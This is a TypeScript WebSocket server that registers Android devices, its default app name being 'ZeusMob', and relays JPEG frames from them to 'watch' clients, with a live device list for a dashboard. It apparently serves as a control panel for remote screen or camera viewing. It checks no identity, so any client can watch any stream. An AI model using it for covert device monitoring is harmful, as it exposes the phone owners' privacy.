import { IncomingMessage } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { logger } from "../lib/logger.js";

interface WsClient {
  ws: WebSocket;
  role: string;
  deviceId?: string;
  ip: string;
}

interface DeviceEntry {
  deviceId: string;
  ip: string;
  app: string;
  online: boolean;
  lastSeen: number;
}

const clients        = new Set<WsClient>();
const deviceRegistry = new Map<string, DeviceEntry>();

function broadcastDeviceList() {
  const devices = [...deviceRegistry.values()];
  const msg = JSON.stringify({ type: "device_list", devices });
  for (const c of clients) {
    if (
      (c.role === "dashboard" || c.role === "status") &&
      c.ws.readyState === WebSocket.OPEN
    ) {
      c.ws.send(msg);
    }
  }
}

export function createWsServer(server: import("http").Server): WebSocketServer {
  const wss = new WebSocketServer({ server, path: undefined });

  wss.on("connection", (ws: WebSocket, req: IncomingMessage) => {
    const url      = new URL(req.url ?? "/", "http://localhost");
    const role     = url.searchParams.get("role") ?? "unknown";
    const deviceId = url.searchParams.get("deviceId") ?? undefined;
    const ip = (
      (req.headers["x-forwarded-for"] as string | undefined)
        ?.split(",")[0].trim()
      ?? req.socket.remoteAddress
      ?? "unknown"
    );

    // Log every new connection with IP
    logger.info({ role, deviceId, ip }, `Nova tentativa de conexão WebSocket de: ${ip}`);

    const client: WsClient = { ws, role, deviceId, ip };
    clients.add(client);

    // Welcome message
    ws.send(JSON.stringify({ type: "welcome", role, deviceId }));

    // Send current device list immediately to dashboard clients
    if (role === "dashboard" || role === "status") {
      ws.send(JSON.stringify({ type: "device_list", devices: [...deviceRegistry.values()] }));
    }

    ws.on("message", (raw) => {
      let msg: Record<string, unknown>;
      try {
        msg = JSON.parse(raw.toString()) as Record<string, unknown>;
      } catch {
        // Binary frame (JPEG) — relay to watchers for this device
        if (deviceId && role === "device") {
          for (const c of clients) {
            if (
              c.role === "watch" &&
              c.deviceId === deviceId &&
              c.ws.readyState === WebSocket.OPEN
            ) {
              c.ws.send(raw);
            }
          }
        }
        return;
      }

      // Support both "type" and "event" field names (Android sends "event")
      const evtType = ((msg.type ?? msg.event) as string | undefined) ?? "";

      // ── Device online ─────────────────────────────────────────────
      if (evtType === "device_online") {
        const devId = (msg.deviceId as string | undefined) ?? deviceId ?? ip;
        deviceRegistry.set(devId, {
          deviceId: devId,
          ip,
          app:      (msg.app as string | undefined) ?? "ZeusMob",
          online:   true,
          lastSeen: Date.now(),
        });
        logger.info({ devId, ip, app: msg.app }, "Dispositivo registado como ONLINE");
        broadcastDeviceList();
        ws.send(JSON.stringify({ type: "device_registered", deviceId: devId }));
      }

      // ── Stream control ────────────────────────────────────────────
      if (evtType === "start_stream") {
        logger.info({ deviceId: msg.deviceId }, "Stream start requested");
        ws.send(JSON.stringify({ type: "stream_ack", status: "started", deviceId: msg.deviceId }));
      }
      if (evtType === "stop_stream") {
        logger.info({ deviceId: msg.deviceId }, "Stream stop requested");
        ws.send(JSON.stringify({ type: "stream_ack", status: "stopped", deviceId: msg.deviceId }));
      }

      // ── JPEG frame relay ──────────────────────────────────────────
      if (evtType === "frame" && msg.deviceId) {
        const srcId = msg.deviceId as string;
        for (const c of clients) {
          if (
            c.role === "watch" &&
            c.deviceId === srcId &&
            c.ws.readyState === WebSocket.OPEN
          ) {
            c.ws.send(raw);
          }
        }
      }
    });

    ws.on("close", () => {
      clients.delete(client);
      logger.info({ role, deviceId, ip }, "WS client desconectado");

      // Mark Android device offline
      if (deviceId && role === "device") {
        const entry = deviceRegistry.get(deviceId);
        if (entry) {
          entry.online   = false;
          entry.lastSeen = Date.now();
          broadcastDeviceList();
          logger.info({ deviceId, ip }, "Dispositivo marcado como OFFLINE");
        }
      }
    });

    ws.on("error", (err) => {
      logger.error({ err, role, deviceId, ip }, "WS error");
    });
  });

  // Broadcast stats + device list every 5 s
  setInterval(() => {
    const statsMsg = JSON.stringify({ type: "stats", fps: 0, latencyMs: 0, batteryPct: 0 });
    for (const c of clients) {
      if (c.role === "watch" && c.ws.readyState === WebSocket.OPEN) {
        c.ws.send(statsMsg);
      }
    }
    broadcastDeviceList();
  }, 5000);

  return wss;
}
